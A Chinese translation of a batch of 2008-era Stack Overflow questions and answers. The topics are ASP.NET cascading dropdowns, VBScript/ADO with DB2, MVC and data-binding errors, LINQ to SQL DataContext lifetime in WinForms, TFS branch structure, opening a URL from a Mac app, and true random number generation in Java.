# StackOverflow 问答 000381000-000381999

# c# - AJAX + ASP.net 从 Sql Server 检索数据？

> ID：381004
> 
> 赞同：0
> 
> 时间：2008-12-19T13:44:09.033
> 
> 标签：c#, asp.net, javascript, ajax

我正在寻找动态控制一组下拉列表，以便在另一个下拉列表的索引发生更改后它们将过滤其项目。

我在 C#/ASP.net 中工作，如果我可以直接从 Sql Server 获取必要的数据，那就太好了。我想每当新数据上传到服务器时我都可以生成一个 xml 文件，但这听起来很痛苦。

有没有明显的方法来做我需要做的事情？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-19T13:57:41.987

查看[CascadingDropDown 控件](http://www.asp.net/ajax/ajaxcontroltoolkit/samples/CascadingDropDown/CascadingDropDown.aspx)。它是 ASP.NET Ajax Control Toolkit 的一部分。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-03-23T04:00:14.407

您可以使用一个下拉菜单的 onchange 事件，在该事件上您可以使用 ajax 更改另一个下拉菜单内容

# vbscript - WSF 和 ADO 与 DB2，recordset.MoveNext 不支持 vbscript 中的错误

> ID：381007
> 
> 赞同：1
> 
> 时间：2008-12-19T13:46:04.727
> 
> 标签：vbscript, db2, ado, wsh

我正在尝试使用 .wsf 文件和 vbscript 循环从 db2 返回的记录集。

vbscript libfile(lib.vbs) 如下

```
'***************  
Const ADOCon="Provider=IBMDADB2.1;Password=*****;User ID=*****;Data Source=yourdatasourc;"
'************************  
'ADO environment is Initialised here  
'*************************  
Function ADOINI(strDB2Cn)  
  With objConnection  
        .Open strSQLCn  
        .CursorLocation=adUseClient  
  End With  
  If objConnection.Errors.Count > 0 Then  
        ErrorOut "Conncetion has Failed."  
  End If  
  With objCommand  
        .ActiveConnection = objConnection  
        .CommandType = adCmdText           
  End With    
End Function  
'********************    
'Execute ADO Comand  
'strSQL - SQL Statment to execute     
'Return ADO RecordSet.  
'*******************************    
Function Exec(strSQL)  
    objCommand.CommandText = strSQL  
    Exec=objCommand.Execute  
End Function  
'******************************************    
    Function ErrorOut(errMsg)  
        Wscript.StdErr.Write Now()&" "&errMsg&vbCrLf   
    End Function  
'****************    
    Function StdOut(msg)   
        WScript.StdOut.Write Now()&" "&msg&vbCrLf   
    End Function  
'************************ 
```

我正在使用 trial.wsf 文件来取回我试图循环的记录集

```
<?xml version="1.0" encoding="utf-8" ?>  
<package xmlns="http://schemas.microsoft.com/WindowsScriptHost">  
<job id="main">  
<object id="objConnection"  progid="ADODB.Connection" />  
<object id="objCommand"     progid="ADODB.Command" />  
<object id="objError"       progid="ADODB.Error" />  
<reference object="ADODB.Connection" />  
<reference object="ADODB.Command" />  
<reference object="ADODB.Error" />  

<script language="VBScript" src="lib.vbs">  

    ADOINI(ADOCon)      
    Set objRS = Exec("SELECT REF_CRSETTINGS.NAME, REF_CRSETTINGS.VALUE FROM   WMRCR.REF_CRSETTINGS REF_CRSETTINGS WHERE TRIM(UPPER(REF_CRSETTINGS.CATEGORY)) IN   ('SAMPLE_SETTINGS') ORDER BY REF_CRSETTINGS.CRSETTINGSCODE")  

' the above recordset is a name value pair based on the category   

 StdOut objRS("NAME").Value 'this worked fine  

objRS.MoveNext ' this doesnt work neither does check for EOF or BOF   

</script>  
</job>  
</package> 
```

我最初的想法是光标类型可能是错误的，
但我什至无法将光标类型设置为动态，不支持 vbscript 错误。

可能是提供商的问题，但无法确认。

我想做这样的事情，但无法在记录集上循环..

```
 Do While Not objRS.EOF  
    Select Case UCase(trim(objRS("NAME").Value))  
      Case "SOAPSERVER"   SOAPSERVER=objRS("VALUE").Value  
      Case "SOAPMESSAGE"   SOAPMESSAGE=objRS("VALUE").Value  
      Case "SOAPACTION"   SOAPACTION=objRS("VALUE").Value  
      Case Else   ErrorOut "Error: InCorrect Value"  
     End Select  
        objRS.MoveNext  
    Loop 
```

我确定这里有一些基本/愚蠢的错误，不精通 wsf 和脚本..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-07-02T11:01:43.027

函数是一段命名的代码，它通过（在 VBScript 中）分配给函数的名称来返回某些内容。您库中的大多数“功能”都没有，因此也没有。

Function Exec 试图返回一个记录集，即一个对象。VBScript 中的对象赋值需要`Set`. 所以：

```
Function Exec(strSQL)  
    objCommand.CommandText = strSQL  
    Set Exec=objCommand.Execute  
End Function 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-27T03:32:56.283

根据评论中提到的知识库文章，您可能只想使用将记录集转储到数组中。GetRows 并处理数组。[检查这个](http://www.w3schools.com/ado/met_rs_getrows.asp)

# asp.net - ASP.NET MVC 错误：此处不允许页面，因为它没有扩展类“System.Web.Page”

> ID：381008
> 
> 赞同：2
> 
> 时间：2008-12-19T13:46:11.557
> 
> 标签：asp.net, asp.net-mvc

我有一个新的 ASP.NET MVC 项目（我的第一个），我在 1 个控制器、视图和模型上运行良好。添加新控制器和视图后，当我尝试运行项目时，我的第一个视图开始抛出此错误消息：

说明：解析服务此请求所需的资源时出错。请查看以下特定的解析错误详细信息并适当地修改您的源文件。

```
Parser Error Message: 'PeopleManagement.Web.Views.Search.Search' is not allowed here because it does not extend class 'System.Web.UI.Page'.

Source Error: 

Line 1:  <%@ Page Title="" Language="C#" MasterPageFile="~/Views/Shared/Master.Master" AutoEventWireup="true" CodeBehind="Search.aspx.cs" Inherits="PeopleManagement.Web.Views.Search.Search" %>
Line 2:  <asp:Content ID="Content1" ContentPlaceHolderID="head" runat="server">
Line 3:  </asp:Content> 
```

这是该 aspx 页面的代码隐藏的全部内容：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;

namespace PeopleManagement.Web.Views.Search
{
    public partial class Search : ViewPage
    {
    }
} 
```

我不确定导致此问题的应用程序发生了什么变化。看起来 VS 可能会将其作为 Web 表单应用程序而不是 MVC 应用程序来阅读？关于我应该从哪里开始排除故障的任何想法？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-12-19T14:06:57.023

我以前也有过这种情况。无法解释。我最终通过再次创建并复制和粘贴标记来重建第一个视图。还可以尝试关闭 VS 并重新启动。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2010-06-08T18:52:51.083

这也发生在我身上。当我将 .aspx 文件添加到项目中后更改它的名称时，就会发生这种情况。更改 .aspx 文件的名称会自动更改 .axpx.cs 和 .axpx.designer.cs 文件的名称，但不会更改 .aspx.cs 文件中原始名称的任何实例。您必须进入并手动更改。我使用的是 VS 2005，所以新版本可能会有所不同。

# iis - 超时后会话未重新初始化？

> ID：381010
> 
> 赞同：1
> 
> 时间：2008-12-19T13:46:16.957
> 
> 标签：iis, session, asp-classic

我有这个经典的 ASP 站点，在我们更新它之前它一直运行良好。这只是一个站点更新，这意味着 .asp 文件在我们的测试环境中运行良好，没有服务包或补丁。我根本无法在同一台服务器上的测试站点上重现该错误。

它运行的系统是 Server 2003 上的 IIS6。

不知何故，当用户使用旧的 session-cookie 重新访问该站点时，它现在开始表现得很奇怪，这使得该站点不再运行 Session_OnStart()。

由于会话早已不复存在，它给我留下了一个空的 Session() 范围，这破坏了网站上的许多代码。

我以前从未见过这种行为，因为我假设访问带有旧会话 cookie 的站点会重新触发 Session_OnStart？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2008-12-20T10:35:57.667

看起来我们的升级，这是一个缓存功能，将数据存储在应用程序范围内，以某种方式破坏了会话处理。

即使有关应用程序和会话范围的内存限制的信息总是说它依赖于资源，但在应用程序范围内使用大量内存会以某种方式破坏某些东西。

我们谈论的是大约 100-200MB 的数据，当我将其存储在文件中时，问题似乎会悄无声息地消失。在类似情况下留下这个答案以供将来参考。

# asp.net - asp.net 小组声明

> ID：381016
> 
> 赞同：2
> 
> 时间：2008-12-19T13:48:36.937
> 
> 标签：asp.net, detailsview

我在使用 asp.net 面板的可见属性时遇到问题。基本上我有一个页面调用数据库表并在详细信息视图中返回结果。但是，返回的一些值是空的，如果是这样，我需要隐藏它旁边的图像。

我正在使用面板来确定是隐藏还是显示图像，但在声明中遇到问题：

visible='<%# Eval("addr1") <> DBNull.Value %>'

我也试过这些：

visible='<%# Eval("addr1") <> DBNull.Value %>'

visible='<%# IIf(Eval("addr1") Is DbNull.Value, "False","True") %>'

当我使用这些时，我得到了错误：

编译器错误消息：CS1026:) 预期

关于语法应该是什么的任何帮助都会很棒。

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-12-19T14:09:10.717

您的语法说 VB.NET，但您的编译器说 C#（CS* 编译器错误）。因为我更信任你的编译器：

```
Visible='<%# Eval("addr1") != DBNull.Value %>' 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-19T14:02:35.130

我讨厌数据绑定（出于很多原因，包括这个），每当我有一个过于复杂的表达式要绑定时。我一直在后面的代码中声明它并调用它来做脏活。

就像是

```
> visible='<%# GetIsVisible(Eval("addr1"))  %>' 
```

然后您定义您的“GetIsVisible”方法以将单个对象作为参数。我将把它留给你，因为你使用的是 VB，我肯定会杀掉它。

**编辑：刚刚注意到您说您使用的是 C#** 如果它在 C# 中，您需要使用 != 运算符，C# 中没有 <> 运算符。

```
> visible='<%# Eval("addr1") <> DBNull.Value %>' 
```

需要像

```
> visible='<%# Eval("addr1") != DBNull.Value %>' 
```

我也很可能只使用[Convert.IsDBNull](http://msdn.microsoft.com/en-us/library/system.convert.isdbnull.aspx)

```
> visible='<%# !Convert.IsDBNull(Eval("addr1")) %>' 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-08T15:48:45.890

很抱歉带回了一个旧线程，只是想说：

可见='<%# !Convert.IsDBNull(Eval("addr1")) %>'

这行得通 - 传奇

谢谢大家

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-19T14:04:10.540

试试： visible='<%# (Eval("addr1") is DbNull.Value?"False":"True") %>'

iif 的正确语法是 (condition?if true this value : if false this value) 假设您使用 c#

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-19T14:05:29.507

嗯...

这行得通吗？

```
visible='<%= IIf(Eval("addr1") Is DbNull.Value, "False","True") %>' 
```

或者你实际上是否有一个分号，就像这样（你不应该有 BTW）

```
visible='<%# IIf(Eval("addr1") Is DbNull.Value, "False","True"); %>' 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-12-19T14:08:08.987

黑暗中的更多刺，试试这个

```
visible="<%# IIf(Eval('addr1') Is DbNull.Value, 'False','True') %>" 
```

# .net - WinForm绑定场景中的Datacontext Lifetime

> ID：381017
> 
> 赞同：6
> 
> 时间：2008-12-19T13:49:27.980
> 
> 标签：.net, winforms, linq-to-sql, data-binding

这个问题困扰了我一段时间。但我不是专家。这个有点长。。。

我有一个带有 Outlook 样式 UI 的 WinForms 应用程序。就是说左侧窗格中有一个栏，允许您选择一个“屏幕”，它是一个 WinForms 控件，例如客户屏幕，在右侧窗格中会出现一个客户列表（即客户控制）。我称之为资源管理器界面。双击记录将在附加窗口中显示非模态客户记录，就像您在 Outlook 中打开电子邮件一样，我们称之为检查员。如果您双击多条记录，您将获得多个检查员。

整个事情是使用数据绑定完成的。客户列表控件上有一个 BindingSource 控件，客户检查器上有另一个。客户控件在其加载事件中更新静态 DataContext，并将简单 Linq-To-SQL 查询的结果分配给 BindingControl 数据源属性。双击客户列表时，事件查找记录，将其转换为 Linq-To-SQL 客户对象，并将其提供给客户检查器表单的构造函数。客户检查器获取客户对象并将其 BindingSource 控件的数据源属性分配给它。

由于 BindingSource 控件支持 IBindingList，因此在调用 EndEdit 之前，不会修改客户对象的内容，在此应用程序中，当单击 OK 按钮时。由于 Linq to SQL 实现了 INotifyPropertyChanged 接口，因此客户列表将被更新。凉爽的。

但是，当我想刷新客户列表的内容以获取其他用户所做的更改时，问题就来了，我希望每隔 60 秒定期发生一次。如果我有一个计时器并在同一个数据上下文上重新运行查询，则不会获取任何更改，因为 Linq to SQL 不想压缩在数据上下文控制下对数据所做的任何更改。奇怪的是，它对数据库运行查询，但身份跟踪意味着只有从数据库返回的新客户对象才会添加到列表中。如果我新建了另一个数据上下文，那么任何开放的客户检查员都不再使用相同的数据上下文，因此未来对开放客户检查员的任何更改都不会反映在客户列表中。

基本上数据是陈旧的，因为我没有使用工作单元模式。所以（如果你还和我在一起），问题是。

**1\. 在这种情况下，我到底如何让工作单元模式工作？ASP.NET 使用请求范围的数据上下文很容易，它的寿命很短，但是在 WinForms 中呢？**

**2\. 在这种情况下，还有其他的 ORM 会更好吗？NHibernate、EF、LLBLGEN 等**

**3\. 我还应该怎么做？**

并且。

**4\. 如果我可以让 Linq to SQL 像这样工作，是否有人在 Linq to SQL 部分类中实现了 IBindingList，这将避免我不得不使用 IBindingSource 控件。（我不确定我应该关心这个）。**

**5\. 如果我可以让 Linq to SQL 像这样工作，有什么方法可以在 SQL 2008 中使用 SQL 通知，以便在底层查询结果发生更改时通知我并重新查询，而不是轮询。**

谢谢！

PS我知道我可以使用

```
db.Refresh(System.Data.Linq.RefreshMode.KeepChanges, customers) 
```

但这会导致针对列表中每个客户记录的数据库运行查询。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-05-20T21:46:48.650

我将重申你的问题，以确保我已经理解它。

您有一个显示实体列表（列表）的小部件。当您单击 LIST 中的项目时，会出现另一个小部件，允许用户编辑实体。当用户完成实体的编辑后，他们的更改将提交到数据库，并且也应该反映在实体列表中。系统还应定期获取其他用户对 LIST 中的项目所做的更改并更新 LIST。

如果这是正确的，我将抛开两个用户编辑同一个实体的任何并发问题，因为这似乎不是您关心的问题，并将重点关注如何组织 UI 和工作单元。

您需要将 LIST 中的实体与检查员正在编辑的实体分开。检查员代表的业务流程是您的工作单元，每个实体一个单元。您的列表不代表一个工作单元。它是所有先前提交的工作单元的组合工作的陈旧表示或时间点。您的 LIST 甚至不必直接处理您的实体，它可以保存一个 ID 或任何其他方式，以便您的检查员在用户单击它时从数据库中获取基础实体。现在，您可以随时更新列表，因为您的检查员根本不与它共享实例。

为了向您的用户模拟，当他们通过检查器编辑实体并让他们看起来绑定到同一事物时，您有两个选择。

1）列表只绑定到数据库中的已提交数据。这很容易，当检查员将本地更改刷新回数据库并成功提交时，为检查员提供了一种告诉列表进行自我更新的方法。

2）列表绑定到已提交数据+本地未提交数据。这有点困难，您需要在列表中公开方法，这些方法允许检查员胜过从 Db 返回的数据，并用自己的本地脏数据覆盖它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-20T17:28:14.670

我目前正在尝试在我们的 WinForms SmartClient 应用程序中实现相同的场景。

你有没有找到一个好的解决方案？

在我们的应用程序中，我们有相同的并发 UI 要求，并且需要从共享源刷新数据，但是我们使用的是 WCF 服务而不是 LinqToSql。我已经实现了我们自己的身份映射和更改跟踪解决方案。

在检查器中对客户所做的更改会反映在其他视图中，这一点显然很重要。但是这种方式给用户的印象是他们的更改已被保存。

我会在工作单元周围画一条线，当您阅读客户列表时开始，并在保存用户更改时结束。如果您重新阅读客户列表并且没有任何变化，那就是一个新的工作单元。如果有更改，那么您需要关闭并保存用户所做的更改，然后才能开始新的工作单元。

我们的问题是我们一次打开了许多窗口，用户很容易进行一些编辑而不是将它们提交到后端。那么他们为什么不能重新加载主列表就不清楚了。

我们决定在这种情况下我们应该自动保存用户的更改。

你有没有想出更好的解决方案？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-09T22:05:27.827

也许有点老了......但关于第 4/5 点，请务必查看 CodePlex 上的 Bindable LINQ 项目。绝对有一些很好的代码可以解决你的问题。

[http://www.codeplex.com/bindablelinq](http://www.codeplex.com/bindablelinq)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-11T23:19:07.663

@Andronicus

在查看了数十个 ORM 之后，我目前正在研究一个名为 Genome ( [http://www.genom-e.com/](http://www.genom-e.com/) ) 的商业 ORM。

我似乎允许我做更多上述事情，比如更高级的数据绑定，并且可以阻止记录变得陈旧，但我仍然在寻找自己的方式。我会让你知道我是怎么过的，但我可能会在某个时候。

@红色的狗

我查看了 BindableLinq，我真的很喜欢它。但它是 Linq to Objects，因此据我所知没有 Linq to SQL 翻译。（除非我错了）。

非常感谢！

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-05-17T03:32:11.593

我尝试过类似的事情，这是我的两分钱。

我不认为你可以在这里实现工作单元模式，因为你的 UI 工作方式。您可能已经知道，LinqToSql DataContext 被设计为一个轻量级且寿命短的对象。它自然地绑定到“工作单元”。在您的情况下，将更改提交到 DB 是一个单元，从 DB 刷新更改是另一个单元。但是您希望一个 DataContext 实例同时完成这两项工作。

另外，我很好奇当一个用户正在编辑一条记录而另一个用户只是将同一条记录上的一些更改提交到 DB 时，你的 UI 应该做什么。从 UI 的角度来看，您如何处理此类并发冲突？

您可能需要在 UI 上做出一些妥协。一种方法是使客户详细信息视图具有“显示”和“编辑”两种模式。Showing 是一个简单的只读视图，在某个时间间隔内会刷新计时器。编辑是一个快照，它允许用户修改数据但不知道其他人的更新。最后，当用户提交更新时，让乐观并发处理冲突。用户在编辑时看不到实时变化。

你的第 5 点很有趣。我们所做的是什么都不做，只是根据间隔或一些信号查询数据库以收集最新更新。我们称之为“发布服务”。为此，您需要在数据库表中有一个时间戳列。

使用“发布服务”，您可以在不使用客户控件中的 DataContext 的情况下获取增量集​​（更新和新记录）。如果您将增量集“合并”到本地 DataBinding 数据源，您的客户详细信息视图应该会刷新。现在，客户控件中的 DataContext 实例专门用于更新。您可以选择让用户决定何时提交。或者，您可以在用户的​​焦点离开该行时（在验证期间）将其提交。就我个人而言，我会选择后者，因为我不想让 DataContext 存活一段无法预料的时间。

# version-control - Team Foundation Server 源代码控制结构

> ID：381020
> 
> 赞同：48
> 
> 时间：2008-12-19T13:52:38.910
> 
> 标签：version-control, tfs, team-project

我一直致力于为新的一年的 Team Foundation Server 部署标准化源代码控制结构。我首先使用 CodePlex 上提供的[Microsoft Team Foundation Server 分支指南](http://www.codeplex.com/BranchingGuidance)文档。

我希望得到一些反馈和对我对拟议结构的一些具体问题的回答。当谈到在 TFS 中构建源代码控制时，我了解到有太多“标准”可供选择，以至于没有真正的标准。

首先，我将概述和描述决策和用法。

```
$/                                                
    {Team Project}/                               
        {Subproject}/                             
            Development/                          
                Trunk/                            
                    Source/
                    Tests/
                    Sandcastle/
                    TeamBuildTypes/
                        {Build Name}/
                Branches/
                    {Branch Name}/
                        Source/
                        Tests/
                        Sandcastle/
                        TeamBuildTypes/
                            {Build Name}/

            Integration/
                Source/
                Tests/
                Sandcastle/
                TeamBuildTypes/
                    {Build Name}/
            Production/
                Releases/
                    {Release Version}/
                        Source/
                        Tests/
                        Sandcastle/
                        TeamBuildTypes/
                            {Build Name}/
                Branches/
                    {Branch Name}/
                        Source/
                        Tests/
                        Sandcastle/
                        TeamBuildTypes/
                           {Build Name}/ 
```

一般逻辑是团队项目可以包含单个逻辑项目（没有`{Subproject}`条目）或产品或工具套件形式的多个相关项目。三个主要容器称为`Development`、`Integration`和`Production`。

在`Development`容器的主干中，文件夹中包含构成产品的两个项目的规定，`Source`文件夹中提供了相应的单元测试`Tests`。大多数次要开发将发生在主干中，可以通过`Trunk`文件夹的同级`Branches`文件夹进行分支，该文件夹充当分支容器。一个或多个解决方案文件将存在于 中`Trunk`，允许该级别的分支捕获解决方案、源代码和单元测试。

该`Integration`容器在非 TFS 实现中通常称为“主”，仅用于集成变更集`Development`以创建稳定且可测试的构建。`Development`一旦获得可测试的产品，它最初是作为容器的一个分支创建的。此容器的构建将用于我们的测试环境和负载测试环境。我们选择将负载测试包含在可测试的构建中，以便我们可以监控性能变化，能够快速隔离可能导致任何违规行为的变更集。

`Production`用于生产预生产和生产质量构建。`Integration`一旦推荐发布稳定版本，它最初是作为容器的一个分支创建的。在`Releases`文件夹中，遵循“按发布分支”结构，在一个地方提供快照和隔离。（例如，当`Release 1.1`准备好进行预生产构建时，稳定`Integration`容器会分支到结构中的新`Release 1.1`文件夹中`Production/Releases`。后续的 RC 和 RTW/RTM 也会被提升到此文件夹中。）还存在一个分支结构，如`Branches`容器中所见。这允许“修补程序”，通常是修订标记（Major.Minor.Revision）。分支是从当前版本创建并合并回新的修订标记 - 比如`Release 1.1.1`. 变更集将在接受后反向集成到`Development`容器中`Trunk`。

我们认为这种结构是稳健性和复杂性之间的公平平衡。但是有一些烦人的问题我无法在逻辑上适合该模型。他们是：

**团队构建**-容器最初将作为夜间构建开始`Development`，`Integration`最终转向持续集成 (CI)。生产容器将手动构建。

*   ~~构建定义应该放在哪里？~~ **编辑 - 基于几个响应，TeamBuildTypes 文件夹已移动到主干并分支到适当的容器。然而，这确实导致了一个新问题（如下）。**

*   通过将 TeamBuildTypes 文件夹放在相应的容器中，这是否意味着所有构建定义都将在相应的文件夹之间复制？例如，具有开发质量构建以及可测试构建等的构建定义，所有这些都存在于整个结构中的所有 TeamBuildType 文件夹中。

**文档生成**- 我们使用 Sandcastle 生成文档。具体来说，我们还使用[Sandcastle Help File Builder](http://www.codeplex.com/SHFB)来管理输出。这将生成一个特定于 SFHB 格式的项目文件。

*   生成的文档是否应该存储在源代码控制结构中？

*   是否应该为每个容器生成文档，还是只对预生产和生产质量构建有价值？

*   为了保持快速的本地构建时间，文档创建是否应该由构建定义拥有？

*   ~~特定于 SHFB 的文件应该放在哪里？我最初的想法是将它作为和文件夹的对等`Source`点`Tests`。~~ ***我同意它与`Source`和同行的建议`Tests`。图表已更改以反映此更改。***

**第三方二进制文件**

*   二进制文件（控件、库等）是否应该存储在源代码管理中？

*   如果是这样，它应该是它自己的团队项目吗？

**通用文档**- 非生成文档，例如需求、设计文档、测试计划等，不会反映在源代码控制结构中的文件夹中。经过与我的开发人员和同行的一些研究和讨论，使用 Team Explorer 中的内置 Documents 文件夹提供了更多好处，因为它反映了 Team Project Portal 中的结构，并且一些（业务）用户不需要额外的复杂性来学习TFS 的源代码控制方面。

* * *

当我得到问题的答案以提供更清晰的画面时，我将更新结构。我也欢迎与潜在变化相关的任何其他评论。如果我有任何其他问题，我会确保修改这篇文章。

**编辑：**

*   **澄清。 `Source`并且`Tests`文件夹也确实存在于`Integration`容器下。**

*   **Micah 和 Josh 都提出了关于第三方二进制文件的重要观点。添加了关于该问题的问题。**

*   **文档生成可能很慢。添加了有关文档创建是否应归特定团队构建类型所有的问题。**

*   **添加了与非生成文档相关的解决方案，例如需求、设计文档、测试计划等。**

*   **为构建定义添加了与 TeamBuildTypes 文件夹相关的分辨率。**

*   **根据各种反馈，将 TeamBuildTypes 文件夹移至主干/分支级别。**

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-12-19T14:28:02.707

我喜欢您将 Sandcastle 文件作为 Source 和 Tests 的对等点的想法，我将添加一个文档文件夹，然后该文件夹将包含 sandcastle 文件，以及可选的实际文档。

意见肯定存在差异，我相信我会因此而被否决（因为我以前曾这样做过）。出于以下几个原因，我会将生成的文档放在 TFS 中：

1.  每个版本都需要您的文档，使用 TFS 是一种简单的方法，可以确保您的文档保留在正确的位置。
2.  使用 TFS 存储它意味着每个人都会知道去哪里获取文档。

我没有看到我一直在努力解决的一件事是第三方依赖项的位置，可能是它们属于源代码，因此它们与每个项目都在一起，尽管如果你想在项目之间共享它们，你可以添加一个新的顶部级节点。

# 编辑

对于我的二进制文件，我通常最终得到

$/第三方/公司/产品/版本/Src（可选）

所以例如我有

$/ThirdParty/Microsoft/EntLib/3.1 4.0 ComponentArt/WebUI/2008.1/Src

我喜欢添加源代码，我不得不修补我讨厌做的 CA 的源代码，但是当第三方没有修复错误时，你必须求助于此。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-12-19T14:12:19.367

很棒的布局和解释。我一直在为完全相同的问题而苦苦挣扎。我最终得到了一个非常相似的结构。我的略有不同。

```
Development/
   Trunk/
      Binaries/  -- Shared libraries
      Source/
      Test/
      Docs/      -- Documentation
TeamBuildTypes/  -- Build definitions 
```

*   添加二进制文件夹允许您在分支中有一个位置，您的所有项目都可以引用共享库
*   我们将文档放在这里，以便它可以与它的特定分支一起移动。
*   我们的构建定义处于开发级别，因为我们可以将它们放在所有分支的一个位置，但它肯定可以在分支级别，这可能更有意义。

> 二进制文件（控件、库等）是否应该存储在源代码管理中？如果是这样，它应该是它自己的团队项目吗？

我认为它们绝对应该是源代码控制的，但我认为没有任何理由将它们放入自己的团队项目中。需要注意的一个问题是 TFS 出于某种原因对二进制文件的处理方式略有不同。我在源代码管理中更新了二进制文件时遇到了问题，但在其他机器上“获取最新”不会导致文件更新。有时您需要执行“获取特定版本”并检查该特定文件的“覆盖未更改的文件”选项。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-12-27T08:39:55.103

你应该把你的 TeamBuilds 文件夹放在你的树干下。这在 TFS2005 中是不可能的，但微软在 2008 年修复了它......

这样做的原因是您的构建可能会随着更新的版本而改变（例如：新的打包方案、不同的测试等），这可能使其与旧的维护版本不兼容。这就是为什么您应该将团队构建与代码版本结合起来。

这样，假设您发布了 1.0 版本并将其放在 Releases 文件夹下。在开发主干中使用 v2.0 时，您将能够构建它并发布补丁（这可能需要修改构建）

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-12-28T17:24:30.690

对于您的二进制文件 - 显然，唯一应该受版本控制的二进制文件是“第三方”程序集，您不会“构建”作为任何自动构建的一部分。如果您有自己的库，并且它们的源代码受版本控制等 - 您应该查看用于构建和同步等的各种策略。

然后我像 Josh 一样组织它们 - 然后使用分支将二进制文件“复制”到一个 _ExternalReferences 文件夹，该文件夹与解决方案树中的 .NET Project 文件夹是对等的。这是服务器端的一种非常有效的方式，因为 TFS 版本控制只存储“Deltas”——所以基本上这些二进制文件在许多项目中的每个“重复”基本上就像一个“指针”。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-12-24T10:31:49.340

我建议的一件事是不要将默认位置用于团队构建并将其包含在“可分支”级别中，因为当您出于各种原因（例如代码提升）进行分支时，您会希望您的构建脚本被分支并同步它。

此外，刚刚在[http://www.codeplex.com/TFSBranchingGuideII上发布了一个新的和更具体的场景指南](http://www.codeplex.com/TFSBranchingGuideII)

# macos - 从 Mac 应用程序启动 Safari

> ID：381021
> 
> 赞同：13
> 
> 时间：2008-12-19T13:53:58.687
> 
> 标签：macos

如何启动 Safari 浏览器或用户的默认浏览器，将其指向我的 Mac 应用程序中的特定地址？

我使用 Objective-C 作为编程语言。

谢谢。

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2008-12-19T13:57:59.037

在 shell 中，您可以使用`open`带有 URL 作为参数的命令，并负责在默认浏览器中打开该 URL。

所以你应该能够使用`system()`或类似`fork()/exec()`的代码来做同样的事情。

注意：`open`也将打开其他类型的文件/ URL，因此请确保它确实是您尝试打开的 Web URL，否则您可能会遇到安全问题。

Objective C的做法似乎是：

```
[[NSWorkspace sharedWorkspace] openURL:url]; 
```

`url`指向 NSURL 对象的指针在哪里

# java - Java中的真正随机生成

> ID：381037
> 
> 赞同：26
> 
> 时间：2008-12-19T14:03:47.340
> 
> 标签：java, random

我正在阅读 Math.random() javadoc，发现随机只是伪随机。

是否有根据环境温度、CPU 温度/电压等随机变量生成随机数的库（特别是 java）？

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2008-12-19T14:05:09.867

查看[http://random.org/](http://random.org/)

RANDOM.ORG 是一个真正的随机数服务，它通过大气噪​​声产生随机性。

可以在这里找到与之交互的 Java 库：http: [//sourceforge.net/projects/trng-random-org/](http://sourceforge.net/projects/trng-random-org/)

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2008-12-22T19:06:24.343

您的问题模棱两可，导致答案到处都是。

如果您正在寻找依赖于系统随机性来源的 Random 实现（我猜您是这样），那么 java.security.SecureRandom 会这样做。java.security 文件中 Sun 安全提供程序的默认配置如下：

```
#
# Select the source of seed data for SecureRandom. By default an
# attempt is made to use the entropy gathering device specified by
# the securerandom.source property. If an exception occurs when
# accessing the URL then the traditional system/thread activity
# algorithm is used.
#
# On Solaris and Linux systems, if file:/dev/urandom is specified and it
# exists, a special SecureRandom implementation is activated by default.
# This "NativePRNG" reads random bytes directly from /dev/urandom.
#
# On Windows systems, the URLs file:/dev/random and file:/dev/urandom
# enables use of the Microsoft CryptoAPI seed functionality.
#
securerandom.source=file:/dev/urandom 
```

如果您真的想用更真正随机的东西覆盖它，可以通过更改此属性或使用另一个 SecureRandom 来完成。例如，您可以使用由 HSM 模块支持的 JCE 提供程序，例如具有自己的 PRNG 的[nCipher nShield ，或线程中提到的其他解决方案。](http://www.ncipher.com/%7E/link.aspx?_id=3F2B4E1B9AE84FD38B3548927B556C51&_z=z)

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2008-12-22T20:05:20.107

又快又脏：

```
public static int generateRandom() throws IOException
{
    int num = 0;
    BufferedReader br = new BufferedReader(new InputStreamReader(System.in));

    for (int i = 0 ; i < Integer.SIZE ; i++)
    {
        System.out
          .println("Flip a fair coin. Enter h for heads, anything else for tails.");

        if (br.readLine().charAt(0) == 'h')
        {
            num += Math.pow(2, i);
        }
    }

    return num;
} 
```

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2008-12-19T14:06:31.097

由于利用这些随机数据源需要某种硬件访问权限，因此无法使用纯 Java 可移植地编写此类库。

但是，您可以尝试编写与平台相关的代码来读取随机数据的平台源。例如，对于 Linux（可能还有其他类似 Unix 的系统）可能是这样`/dev/random`。

另外，看看[SecureRandom](http://java.sun.com/javase/6/docs/api/java/security/SecureRandom.html)类，它可能已经有了你想要的。

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2008-12-19T14:28:58.647

